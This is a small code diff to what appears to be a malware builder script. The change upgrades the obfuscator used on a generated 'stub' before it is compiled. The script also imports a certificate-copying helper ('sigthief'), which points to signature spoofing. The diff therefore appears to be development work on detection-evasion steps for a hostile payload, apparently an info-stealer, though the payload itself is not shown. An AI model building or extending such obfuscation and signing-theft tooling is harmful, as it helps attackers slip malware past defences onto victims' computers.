@@ -11,7 +11,7 @@ import zipfile
 
 from urllib3 import PoolManager, disable_warnings
 disable_warnings()
-import BlankOBF as obfuscator
+from BlankOBFv2 import BlankOBFv2
 from sigthief import outputCert
 
 SettingsFile = "config.json"
@@ -172,8 +172,8 @@ def main() -> None:
 
     code = WriteSettings(code, *ReadSettings())
     PrepareEnvironment(ReadSettings()[0])
-
-    obfuscator.BlankOBF(code, OutCodeFile)
+    obfuscator = BlankOBFv2(code, include_imports=False, recursion=1)
+    OutCodeFile = obfuscator.obfuscate()
     junk(OutCodeFile)
 
     compiledFile = "stub-o.pyc"
